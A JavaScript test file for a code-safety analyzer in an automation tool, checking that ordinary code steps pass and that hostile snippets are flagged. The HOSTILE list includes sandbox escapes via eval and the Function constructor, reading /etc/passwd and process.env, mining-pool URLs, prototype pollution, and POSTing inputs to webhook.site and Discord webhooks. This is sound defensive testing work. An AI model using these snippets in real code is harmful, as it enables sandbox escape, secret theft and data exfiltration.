'use strict';

/**
 * analyzeCode against two corpora: ordinary code steps that must come out
 * clean (a false positive teaches people to ignore the checks), and hostile
 * snippets that must be caught with the right rule and severity.
 *
 * Run: node --test automation/codeSafety/index.test.js
 */

const { test } = require('node:test');
const assert = require('node:assert');
const { analyzeCode, blockingFindings } = require('./index');

const BENIGN = [
    'return inputs.items.map((i) => ({ ...i, total: i.qty * i.price }));',
    'const d = new Date(inputs.date); d.setDate(d.getDate() + 30); return { due: d.toISOString().slice(0, 10) };',
    'return { name: String(inputs.name || "").trim().toUpperCase() };',
    'const rows = inputs.rows || []; return rows.filter((r) => r.status === "open").length;',
    'const res = await ctx.http("https://api.example.com/v1/rates?base=EUR"); return JSON.parse(res.body);',
    'const res = await ctx.http(`https://api.example.com/items/${inputs.id}`, { method: "GET" }); return res.status;',
    'const base = "https://api.example.com/"; const r = await ctx.http(base + "orders/" + inputs.id); return r.body;',
    'const sum = inputs.lines.reduce((s, l) => s + l.amount, 0); return { sum, vat: sum * 0.21 };',
    'function process(items) { return items.map((x) => x * 2); } return process(inputs.values);',
    'const { amount, rate = 21 } = inputs; return amount * (1 + rate / 100);',
    'for (const row of inputs.rows) { row.name = row.name.trim(); } return inputs.rows;',
    'let i = 0; while (i < inputs.n) { i += 1; } return i;',
    'const out = {}; for (const [k, v] of Object.entries(inputs.map)) { out[k.toLowerCase()] = v; } return out;',
    'ctx.log("processing", inputs.items.length); return inputs.items.slice(0, 10);',
    'const email = inputs.email; if (!/^[^@]+@[^@]+$/.test(email)) throw new Error("bad email"); return email;',
    'const r = await ctx.integrations.gmail_send({ to: inputs.to, subject: "Hi" }); return r;',
    'const sorted = [...inputs.list].sort((a, b) => a.date.localeCompare(b.date)); return sorted[0];',
    'return Math.round(inputs.value * 100) / 100;',
    'const parts = inputs.csv.split("\\n").map((l) => l.split(",")); return parts;',
    'async function main(inputs, ctx) { return { ok: true, n: inputs.n }; }',
    '/** Doubles a number. @param {number} n - The number */ function main({ n }) { return n * 2; }',
    'const byKey = new Map(); for (const x of inputs.xs) byKey.set(x.id, x); return [...byKey.values()];',
    'const obj = { eval: 1, constructor: 2 }; return obj.eval + obj.constructor;',
    'const x = inputs.x; return typeof x === "function" ? "fn" : x instanceof Object;',
    'return JSON.stringify({ a: 1 }).length;',
    'const res = await ctx.http("https://graph.microsoft.com/v1.0/me"); return res.status === 200;',
    'try { return JSON.parse(inputs.text); } catch (e) { return { error: e.message }; }',
    'const pad = (n) => String(n).padStart(2, "0"); const d = new Date(); return `${d.getFullYear()}-${pad(d.getMonth() + 1)}`;',
];

const HOSTILE = [
    ['return eval("1+1");', 'dynamic-code', 'block'],
    ['const e = (0, eval); return e("2");', 'dynamic-code', 'block'],
    ['return globalThis["ev" + "al"]("1");', 'dynamic-code', 'block'],
    ['return new Function("return this")();', 'dynamic-code', 'block'],
    ['return Function("return process")();', 'dynamic-code', 'block'],
    ['return [].constructor.constructor("return this")();', 'dynamic-code', 'block'],
    ['const k = "constructor"; return ({})[k][k]("return 1")();', 'dynamic-code', 'block'],
    ['return Function.prototype.constructor("x");', 'dynamic-code', 'block'],
    ['return ""["con" + "structor"]["con" + "structor"]("return 1")();', 'dynamic-code', 'block'],
    ['with (inputs) { return a; }', 'dynamic-code', 'block'],
    ['setTimeout("doEvil()", 0);', 'dynamic-code', 'block'],
    ['return require("fs").readFileSync("/etc/passwd", "utf8");', 'node-access', 'block'],
    ['return process.env;', 'node-access', 'block'],
    ['const m = await import("fs"); return m;', 'node-access', 'block'],
    ['return typeof __hostHttp;', 'host-internals', 'block'],
    ['return globalThis["__bfSettle"];', 'host-internals', 'block'],
    ['const r = inputs.ref; return r.derefInto();', 'host-internals', 'block'],
    ['return new WebAssembly.Module(new Uint8Array([0]));', 'low-level', 'block'],
    ['const s = new SharedArrayBuffer(8); return s;', 'low-level', 'block'],
    ['await ctx.http("https://pool.minexmr.com/submit");', 'mining', 'block'],
    ['const pool = "stratum+tcp://xmr.example.org:3333"; return pool;', 'mining', 'block'],
    ['Object.prototype.polluted = true; return 1;', 'builtin-tampering', 'warn'],
    ['Array.prototype.map = function () { return []; }; return 1;', 'builtin-tampering', 'warn'],
    ['const o = {}; o.__proto__.x = 1; return o;', 'builtin-tampering', 'warn'],
    ['Error.prepareStackTrace = (e, s) => s; return new Error().stack;', 'builtin-tampering', 'warn'],
    ['return Object.getOwnPropertyNames(globalThis);', 'builtin-tampering', 'warn'],
    ['for (const k in globalThis) ctx.log(k); return 1;', 'builtin-tampering', 'warn'],
    [`return "${'QUJD'.repeat(400)}ZXhhbXBsZS0xMjM0NTY3ODkwYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXo=";`, 'obfuscation', 'warn'],
    ['return String.fromCharCode(114,101,113,117,105,114,101,40,34,102,115,34,41,46,114,101,97,100,70,105,108,101);', 'obfuscation', 'warn'],
    ['await ctx.http("https://webhook.site/abc-123", { method: "POST", body: inputs }); return 1;', 'collection-host', 'warn'],
    ['await ctx.http("https://discord.com/api/webhooks/1/abc", { method: "POST", body: { content: "x" } });', 'collection-host', 'warn'],
    ['const key = "sk-abcdefghijklmnopqrstuvwxyz123456"; return key.length;', 'hardcoded-secret', 'warn'],
    // Built at run time so the secret scanner never meets a key-shaped literal in this file.
    [`const k = "${['AKIA', 'ABCDEFGHIJKLMNOP'].join('')}"; return k;`, 'hardcoded-secret', 'warn'],
    ['const r = await ctx.http(inputs.url); return r.body;', 'dynamic-host', 'warn'],
    ['const end = Date.now() + 5000; while (Date.now() < end) {} return 1;', 'busy-wait', 'warn'],
    ['while (true) { inputs.n++; }', 'busy-wait', 'warn'],
    ['return await ctx.integrations.slack_post({ text: "x" });', 'tool-not-allowed', 'warn'],
];

test('benign code steps come out clean: no block, no warn', () => {
    for (const code of BENIGN) {
        const a = analyzeCode(code, { allowedTools: ['gmail_send'] });
        assert.ok(a.ok, `did not parse: ${code}\n${JSON.stringify(a.syntaxError)}`);
        const loud = a.findings.filter((f) => f.severity !== 'info');
        assert.deepStrictEqual(loud.map((f) => f.ruleId), [], `false positive on: ${code}`);
    }
    assert.ok(BENIGN.length >= 25);
});

test('hostile code steps are caught with the right rule and severity', () => {
    for (const [code, ruleId, severity] of HOSTILE) {
        const a = analyzeCode(code);
        assert.ok(a.ok, `did not parse: ${code}`);
        const hit = a.findings.find((f) => f.ruleId === ruleId);
        assert.ok(hit, `${ruleId} missed on: ${code}\ngot ${JSON.stringify(a.findings.map((f) => f.ruleId))}`);
        assert.strictEqual(hit.severity, severity, `${ruleId} severity on: ${code}`);
        assert.ok(hit.message && hit.messageKey.startsWith('code_step.rule.'), 'a plain sentence and an i18n key');
    }
    assert.ok(HOSTILE.length >= 25);
});

test('parameters come from the JSDoc on main, with descriptions, defaults and choices', () => {
    const a = analyzeCode(`/**
 * Adds VAT to an amount.
 *
 * @param {object} inputs
 * @param {number} inputs.amount - The amount without VAT
 * @param {number} [inputs.vatRate=21] - VAT percentage
 * @param {'EUR'|'USD'} [inputs.currency='EUR'] - Currency of the amount
 * @returns {{ total: number }} The amount including VAT
 */
async function main(inputs, ctx) {
    return { total: inputs.amount * (1 + inputs.vatRate / 100), extra: inputs.note };
}`);
    assert.strictEqual(a.description, 'Adds VAT to an amount.');
    assert.deepStrictEqual(a.params.map((p) => [p.name, p.label, p.type, p.required, p.default]), [
        ['amount', 'Amount', 'number', true, undefined],
        ['vatRate', 'VAT rate', 'number', false, 21],
        ['currency', 'Currency', 'string', false, 'EUR'],
    ]);
    assert.strictEqual(a.params[0].description, 'The amount without VAT');
    assert.deepStrictEqual(a.params[2].enum, ['EUR', 'USD']);
    assert.strictEqual(a.returns.description, 'The amount including VAT');
    assert.deepStrictEqual(a.capabilities.undeclaredInputs, ['note'], 'read but not declared: still editable');
});

test('a default in a destructured first parameter counts when the JSDoc has none', () => {
    const a = analyzeCode(`/**
 * @param {number} rate - Percentage
 */
function main({ rate = 21, other }, ctx) { return rate + other; }`);
    assert.deepStrictEqual(a.params.map((p) => [p.name, p.required, p.default]), [['rate', false, 21]]);
    assert.deepStrictEqual(a.capabilities.undeclaredInputs, ['other']);
});

test('capabilities: literal hosts, tools, http in a loop', () => {
    const a = analyzeCode(`for (const id of inputs.ids) { await ctx.http('https://api.example.com/x/' + id); }
        await ctx.integrations.gmail_send({});`, { allowedTools: ['gmail_send'] });
    assert.deepStrictEqual(a.capabilities.hosts, ['api.example.com']);
    assert.deepStrictEqual(a.capabilities.tools, ['gmail_send']);
    assert.strictEqual(a.capabilities.httpInLoop, true);
    assert.deepStrictEqual(a.findings.map((f) => [f.ruleId, f.severity]), [['http-in-loop', 'info']]);
});

test('listing the hosts silences dynamic-host', () => {
    const code = 'return (await ctx.http(inputs.url)).status;';
    assert.ok(analyzeCode(code).findings.some((f) => f.ruleId === 'dynamic-host'));
    assert.ok(!analyzeCode(code, { allowedHosts: ['api.example.com'] }).findings.some((f) => f.ruleId === 'dynamic-host'));
});

test('a syntax error is reported with a 1-based position, not as a finding', () => {
    const a = analyzeCode('return {;');
    assert.strictEqual(a.ok, false);
    assert.strictEqual(a.syntaxError.line, 1);
    assert.ok(a.syntaxError.column >= 1);
    assert.deepStrictEqual(a.findings, []);
});

test('the hash ignores line endings and trailing spaces, not content', () => {
    assert.strictEqual(analyzeCode('return 1;  \r\n').hash, analyzeCode('return 1;\n').hash);
    assert.notStrictEqual(analyzeCode('return 1;').hash, analyzeCode('return 2;').hash);
});

test('blockingFindings picks only the blocks', () => {
    const a = analyzeCode('eval("x"); Object.prototype.y = 1;');
    assert.deepStrictEqual(blockingFindings(a).map((f) => f.ruleId), ['dynamic-code']);
});
